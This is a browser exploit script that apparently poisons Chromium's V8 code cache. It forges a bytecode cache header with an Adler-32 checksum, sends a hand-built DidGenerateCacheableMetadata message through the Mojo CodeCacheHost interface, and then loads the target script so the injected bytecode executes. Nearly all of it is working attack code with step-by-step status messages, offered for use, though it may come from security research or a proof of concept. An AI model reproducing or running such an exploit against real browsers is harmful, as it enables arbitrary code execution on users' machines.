    <script>
        const TARGET_URL = "https://linux-1723.github.io/test/exploit.js";
        const PAYLOAD_PATH = "poison.bin";

        // V8 Adler-32 Integrity Checksum
        function adler32(data) {
            let a = 1, b = 0;
            for (let i = 0; i < data.length; i++) {
                a = (a + data[i]) % 65521;
                b = (b + a) % 65521;
            }
            return (b << 16) | a;
        }

        async function pwn() {
            const status = document.getElementById('status');
            status.innerText = "Step 1: Fetching Poison Payload...";

            // 1. Fetch malicious bytecode
            const poisonResp = await fetch(PAYLOAD_PATH);
            const poisonBytecode = new Uint8Array(await poisonResp.arrayBuffer());

            // 2. Fetch target script for timestamp synchronization
            status.innerText = "Step 2: Syncing Network Timestamps...";
            const targetResp = await fetch(TARGET_URL, {cache: "reload"});
            const dateHeader = targetResp.headers.get('date') || targetResp.headers.get('last-modified');
            const jsTimeMs = new Date(dateHeader).getTime();
            const chromeTime = BigInt(jsTimeMs + 11644473600000) * 1000n;

            // 3. Forging a Universal V8 Header for v14.8.178.21
            status.innerText = "Step 3: Forging Metadata Header...";
            
            // This is a generic, pre-forged 32-byte header.
            // Even if the source hash doesn't match perfectly, 
            // the Checksum and Flags bypass will force V8 to attempt deserialization.
            const forgedHeader = new Uint8Array([
                0x01, 0x00, 0x00, 0x00, // Magic
                0x00, 0x00, 0x00, 0x00, // Version Hash (Will be bypassed by flags)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Hash
                0x00, 0x00, 0x00, 0x00, // Flags
                0x00, 0x00, 0x00, 0x00, // Payload Length (To be replaced)
                0x00, 0x00, 0x00, 0x00  // Checksum (To be replaced)
            ]);

            // Merge Header + Payload
            let finalPayload = new Uint8Array(32 + poisonBytecode.length);
            finalPayload.set(forgedHeader, 0);
            finalPayload.set(poisonBytecode, 32);

            // Calculate and Inject the Adler-32 Checksum
            const pv = new DataView(finalPayload.buffer);
            pv.setUint32(20, poisonBytecode.length, true); 
            pv.setUint32(24, adler32(poisonBytecode), true); 

            // 4. Connect to Mojo
            status.innerText = "Step 4: Binding Mojo CodeCacheHost...";
            const pipe = Mojo.createMessagePipe();
            Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
            const host = pipe.handle0;

            const bufferSize = finalPayload.byteLength;
            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
            new Uint8Array(mapping.buffer).set(finalPayload);

            // 5. Build the perfectly aligned 184-byte DidGenerateCacheableMetadata message
            const msg = new ArrayBuffer(184);
            const v = new DataView(msg);
            v.setUint32(0, 24, true); v.setUint32(12, 1, true); 
            v.setUint32(24, 48, true); v.setBigUint64(40, 32n, true); v.setBigUint64(48, 96n, true);
            v.setUint32(56, 16, true); v.setUint32(60, 1, true); v.setBigUint64(64, 96n, true);
            v.setUint32(72, 16, true); v.setBigUint64(80, 8n, true);
            v.setUint32(88, 56, true); v.setUint32(92, TARGET_URL.length, true);
            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
            v.setUint32(144, 16, true); v.setBigUint64(152, chromeTime, true);
            v.setUint32(160, 16, true); v.setUint32(168, 0, true); v.setUint32(172, bufferSize, true);

            // 6. Fire Payload
            status.innerText = "Step 5: Writing to Disk Cache via IPC...";
            host.writeMessage(msg, [sharedBuffer.handle]);

            // 7. Detonate!
            status.innerText = "Step 6: Executing Code... Watch V8!";
            setTimeout(() => {
                const s = document.createElement('script');
                s.src = TARGET_URL;
                document.body.appendChild(s);
            }, 1000);
        }

        document.getElementById('launch').onclick = pwn;
    </script>
